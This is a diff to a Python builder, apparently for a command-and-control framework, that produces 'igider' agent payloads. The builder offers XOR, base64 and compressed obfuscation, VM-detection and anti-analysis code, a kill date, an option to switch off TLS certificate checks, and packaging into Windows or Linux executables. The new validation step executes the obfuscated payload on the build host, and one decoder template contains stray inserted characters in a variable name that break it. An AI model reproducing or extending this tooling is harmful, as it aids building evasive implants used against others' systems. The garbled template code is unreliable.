@@ -15,6 +15,7 @@ import logging
 from typing import Dict, Any, List, Optional
 from itertools import cycle
 import datetime
+import ssl
 
 class Igider(PayloadType):
     name = "igider"
@@ -34,7 +35,7 @@ class Igider(PayloadType):
             name="output",
             parameter_type=BuildParameterType.ChooseOne,
             description="Choose output format",
-            choices=["py", "base64", "py_compressed", "one_liner","executable"],
+            choices=["py", "base64", "py_compressed", "one_liner", "executable"],
             default_value="py"
         ),
         BuildParameter(
@@ -128,7 +129,7 @@ class Igider(PayloadType):
     def _load_module_content(self, module_path: str) -> str:
         """Safely load content from a module file."""
         try:
-            with open(module_path, "r") as f:
+            with open(module_path, "r", encoding="utf-8") as f:
                 return f.read()
         except Exception as e:
             self.logger.error(f"Error loading module {module_path}: {e}")
@@ -198,7 +199,7 @@ exec(''.join({xor_func} for c,k in zip(base64.b64decode({var_b64}), {var_iter}))
         decoder = f"""
 import base64, itertools, sys, random
 
-def {junk1_name}():
+def {junk固然1_name}():
     return [random.randint(1, 100) for _ in range(10)]
 
 {var_data} = {encoded}
@@ -295,7 +296,7 @@ exec(zlib.decompress(base64.b64decode({compressed_b64})))
     def _add_evasion_features(self, code: str) -> str:
         """Add anti-analysis and VM detection capabilities with robust error handling."""
         evasion_code = []
-         # 1. Add kill date check if specified
+        # 1. Add kill date check if specified
         try:
             kill_date = self.c2info[0].get_parameters_dict().get("killdate", "").strip()
             if kill_date:
@@ -313,7 +314,7 @@ if datetime.datetime.now() > datetime.datetime.strptime("{kill_date}", "%Y-%m-%d
         except (IndexError, AttributeError, TypeError) as e:
             self.logger.debug(f"Could not retrieve kill_date: {e}")
 
-    # 2. Add platform-agnostic evasion checks
+        # 2. Add platform-agnostic evasion checks
         evasion_code.append("""
 def check_environment():
     import os
@@ -403,7 +404,7 @@ def check_environment():
 #     sys.exit(0)
 """)
     
-    # Combine all evasion code and prepend to the original code
+        # Combine all evasion code and prepend to the original code
         return "\n".join(evasion_code) + "\n" + code
 
     async def build(self) -> BuildResponse:
@@ -428,6 +429,12 @@ def check_environment():
                 return resp
                 
             base_code = self._load_module_content(base_agent_path)
+            if not base_code:
+                build_errors.append("Base agent code is empty")
+                await self.update_build_step("Gathering Components", "Base agent code is empty", False)
+                resp.set_status(BuildStatus.Error)
+                resp.build_stderr = "\n".join(build_errors)
+                return resp
             
             # Load appropriate crypto module
             crypto_method = self.get_parameter("cryptography_method")
@@ -461,7 +468,6 @@ def check_environment():
             base_code = base_code.replace("UUID_HERE", self.uuid)
             base_code = base_code.replace("#COMMANDS_PLACEHOLDER", command_code)
             
-            
             # Process C2 profile configuration
             for c2 in self.c2info:
                 profile = c2.get_c2profile()["name"]
@@ -471,7 +477,7 @@ def check_environment():
             if self.get_parameter("https_check") == "No":
                 base_code = base_code.replace("urlopen(req)", "urlopen(req, context=gcontext)")
                 base_code = base_code.replace("#CERTSKIP", 
-                """
+                    """
         gcontext = ssl.create_default_context()
         gcontext.check_hostname = False
         gcontext.verify_mode = ssl.CERT_NONE\n""")
@@ -515,75 +521,140 @@ def check_environment():
                 
                 try:
                     with tempfile.TemporaryDirectory() as tmp_dir:
-                        # 1. Write payload file
+                        # Ensure temporary directory has write permissions
+                        os.chmod(tmp_dir, 0o755)
+                        self.logger.debug(f"Created temporary directory: {tmp_dir}")
+                        
+                        # Write payload file
                         py_path = os.path.join(tmp_dir, "payload.py")
                         with open(py_path, "w", encoding="utf-8") as f:
                             f.write(base_code)
-
-                        # 2. Configure PyInstaller command
+                        os.chmod(py_path, 0o644)
+                        self.logger.debug(f"Wrote payload to {py_path}, content length: {len(base_code)} bytes")
+                        
+                        # Validate obfuscated code (if applicable)
+                        if obfuscation_level in ["basic", "advanced"]:
+                            try:
+                                proc = await asyncio.create_subprocess_exec(
+                                    "python3", py_path,
+                                    stdout=asyncio.subprocess.PIPE,
+                                    stderr=asyncio.subprocess.PIPE
+                                )
+                                stdout, stderr = await proc.communicate()
+                                if proc.returncode != 0:
+                                    self.logger.error(f"Obfuscated code validation failed: {stderr.decode()}")
+                                    raise Exception(f"Obfuscated code is invalid: {stderr.decode()}")
+                            except Exception as e:
+                                raise Exception(f"Obfuscation validation failed: {str(e)}")
+                        
+                        # Configure PyInstaller command
                         pyinstaller_cmd = [
-                            "pyinstaller",
+                            "python3", "-m", "PyInstaller",
                             "--name=payload",
                             "--clean",
                             "--noconfirm",
-                            "--log-level=ERROR",
+                            "--log-level=DEBUG",
                             "--distpath", os.path.join(tmp_dir, "dist"),
                             "--workpath", os.path.join(tmp_dir, "build"),
                             "--specpath", tmp_dir
                         ]
-
+                        
                         # OS-specific configurations
+                        file_ext = ".exe" if self.selected_os == SupportedOS.Windows else ""
                         if self.selected_os == SupportedOS.Windows:
                             pyinstaller_cmd.extend(["--icon=NONE"])
                             if self.get_parameter("executable_console") == "False":
                                 pyinstaller_cmd.append("--noconsole")
-                            file_ext = ".exe"
-                        else:
-                            file_ext = ""
-
-                        # Build mode selection
-                        if self.get_parameter("executable_type") == "onefile":
+                        build_mode = self.get_parameter("executable_type")
+                        if build_mode == "onefile":
                             pyinstaller_cmd.append("--onefile")
-                            exec_path = os.path.join(tmp_dir, "dist", f"payload{file_ext}")
-                        else:
+                        else:  # onedir mode
                             pyinstaller_cmd.append("--onedir")
-                            exec_path = os.path.join(tmp_dir, "dist", "payload", f"payload{file_ext}")
-
+                        
                         pyinstaller_cmd.append(py_path)
-
-                        # 3. Execute PyInstaller
+                        
+                        # Execute PyInstaller
+                        self.logger.debug(f"Running PyInstaller with command: {' '.join(pyinstaller_cmd)}")
                         proc = await asyncio.create_subprocess_exec(
                             *pyinstaller_cmd,
                             stdout=asyncio.subprocess.PIPE,
                             stderr=asyncio.subprocess.PIPE
                         )
                         stdout, stderr = await proc.communicate()
-
+                        
+                        stdout_text = stdout.decode() if stdout else ""
+                        stderr_text = stderr.decode() if stderr else ""
+                        self.logger.debug(f"PyInstaller stdout: {stdout_text}")
+                        self.logger.debug(f"PyInstaller stderr: {stderr_text}")
+                        
                         if proc.returncode != 0:
-                            raise Exception(f"PyInstaller failed: {stderr.decode().strip() or stdout.decode().strip()}")
-
-                        # 4. Verify and load executable
-                        if not os.path.exists(exec_path):
-                            # Diagnostic output
-                            available = []
+                            raise Exception(f"PyInstaller failed: {stderr_text or stdout_text}")
+                        
+                        # Check dist directory contents
+                        dist_dir = os.path.join(tmp_dir, "dist")
+                        dir_contents = os.listdir(dist_dir) if os.path.exists(dist_dir) else []
+                        self.logger.debug(f"dist directory contents: {dir_contents}")
+                        
+                        # Find the executable
+                        executable_found = False
+                        if self.selected_os == SupportedOS.Windows:
+                            # Expected paths for Windows
+                            expected_paths = [
+                                os.path.join(dist_dir, "payload", "payload.exe"),  # onedir
+                                os.path.join(dist_dir, "payload.exe")  # onefile
+                            ]
+                            for path in expected_paths:
+                                if os.path.isfile(path):
+                                    self.logger.info(f"Found Windows executable: {path}")
+                                    with open(path, "rb") as f:
+                                        resp.payload = f.read()
+                                    resp.filename = f"payload{file_ext}"
+                                    resp.build_message = f"Successfully built {build_mode} executable"
+                                    executable_found = True
+                                    break
+                        else:
+                            # Expected paths for Linux/macOS
+                            expected_paths = [
+                                os.path.join(dist_dir, "payload"),  # onefile
+                                os.path.join(dist_dir, "payload", "payload")  # onedir
+                            ]
+                            for path in expected_paths:
+                                if os.path.isfile(path):
+                                    self.logger.info(f"Found executable: {path}")
+                                    os.chmod(path, 0o755)  # Ensure executable permissions
+                                    with open(path, "rb") as f:
+                                        resp.payload = f.read()
+                                    resp.filename = "payload"
+                                    resp.build_message = f"Successfully built {build_mode} executable"
+                                    executable_found = True
+                                    break
+                        
+                        if not executable_found:
+                            # Log detailed directory structure
+                            detailed_dir_structure = {}
                             for root, dirs, files in os.walk(tmp_dir):
-                                for name in files:
-                                    available.append(os.path.relpath(os.path.join(root, name), tmp_dir))
-                            raise Exception(
-                                f"Executable not found at {exec_path}\n"
-                                f"Build directory contents:\n{json.dumps(available, indent=2)}"
-                            )
-
-                        with open(exec_path, "rb") as f:
-                            resp.payload = f.read()
-
-                        # Set appropriate filename
-                        resp.filename = f"payload{file_ext}"
-                        resp.build_message = f"Successfully built {self.get_parameter('executable_type')} executable"
-
+                                rel_path = os.path.relpath(root, tmp_dir)
+                                file_info = [
+                                    {
+                                        "name": f,
+                                        "size": os.path.getsize(os.path.join(root, f)),
+                                        "perms": oct(os.stat(os.path.join(root, f)).st_mode)[-3:],
+                                        "executable": os.access(os.path.join(root, f), os.X_OK)
+                                    } for f in files
+                                ]
+                                detailed_dir_structure[rel_path] = {"dirs": dirs, "files": file_info}
+                            self.logger.error(f"Detailed directory structure: {json.dumps(detailed_dir_structure, indent=2)}")
+                            raise Exception(f"Failed to find executable in {dist_dir}. Contents: {dir_contents}")
+                        
+                        return resp
+                
                 except Exception as e:
                     self.logger.error(f"Executable build failed: {str(e)}", exc_info=True)
-                    raise Exception(f"Failed to build executable: {str(e)}")
+                    await self.update_build_step("Finalizing Payload", f"Executable build failed: {str(e)}", False)
+                    resp.set_status(BuildStatus.Error)
+                    resp.build_stderr = f"Error building executable: {str(e)}\nPyInstaller stdout: {stdout_text}\nPyInstaller stderr: {stderr_text}"
+                    return resp
+            
             else:  # default to py
                 resp.payload = base_code.encode()
                 resp.build_message = "Successfully built Python script payload"
